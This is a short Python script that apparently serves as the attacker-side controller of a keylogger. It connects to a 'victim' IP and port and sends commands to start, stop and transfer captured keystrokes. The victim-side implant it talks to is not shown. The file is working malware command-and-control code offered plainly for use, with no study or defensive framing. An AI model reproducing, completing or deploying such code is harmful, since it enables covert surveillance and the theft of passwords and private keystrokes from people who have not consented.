from socket import socket, AF_INET, SOCK_STREAM
from constants import *
from functions import *
import argparse
from os import system

# Argument Parsing
parser = argparse.ArgumentParser(description = "Program for connecting to victim.")
parser.add_argument("--ip", dest="ip", required=True, type=str)
parser.add_argument("--port", dest="port", required=True, type=int)

args = parser.parse_args()
victim_address = (args.ip, args.port)

sock = socket(AF_INET, SOCK_STREAM)
sock.connect(victim_address)
printMenu()
while True:
    try:
        msg = input("$ ")
        if msg == HELP:
            printHelp()
        elif msg == CLEAR:
            system("clear")
        elif msg == START_KEYLOGGER:
            sock.sendall(START_KEYLOGGER.encode("utf-8"))
        elif msg == STOP_KEYLOGGER:
            sock.sendall(STOP_KEYLOGGER.encode("utf-8"))
        elif msg == TRANSFER_KEYLOGGER:
            sock.sendall(TRANSFER_KEYLOGGER.encode("utf-8"))
        elif msg == QUIT:
            sock.sendall(QUIT.encode("utf-8"))
            print("Quitting...")
            break
        else:
            print("Unrecognized Command!")
    except KeyboardInterrupt:
        break
sock.close()

